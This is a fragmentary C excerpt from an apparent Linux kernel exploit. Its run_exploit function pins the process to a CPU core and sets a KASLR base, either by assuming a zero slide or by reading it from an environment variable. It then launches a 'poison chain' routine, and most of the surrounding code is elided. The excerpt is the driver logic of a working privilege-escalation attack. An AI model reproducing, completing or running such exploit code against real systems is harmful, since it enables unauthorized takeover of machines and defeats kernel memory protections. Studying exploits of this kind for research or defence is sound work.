...
int run_exploit(int argc, char **argv) {
  ...
  pin_to_core(CORE);
#ifdef SKIP_SLIDE_KASLR
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_slide = 0;
  kaslr_done = 1;
  pr_success("skip-slide kaslr_base=%016zx (assuming slide=0)\n", kaslr_base);
#else
  {
    const char *ta = getenv("SLIDE_TEXT_ADDR");
    if (ta) {
      kaslr_base = strtoull(ta, NULL, 0);
      kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
      kaslr_done = 1;
      pr_success("slide kaslr env base=%016zx slide=%016zx\n", kaslr_base,
                 kaslr_slide);
    }
  }
  ...
  if (env_flag("CHAIN_POISON", 1) && !getenv("SLIDE_TCP_ROUTE")) {
    pr_success("chain start pid=%d\n", getpid());
    int chain_ok = run_poison_chain();
    pr_success("chain result pid=%d ok=%d\n", getpid(), chain_ok);
  }
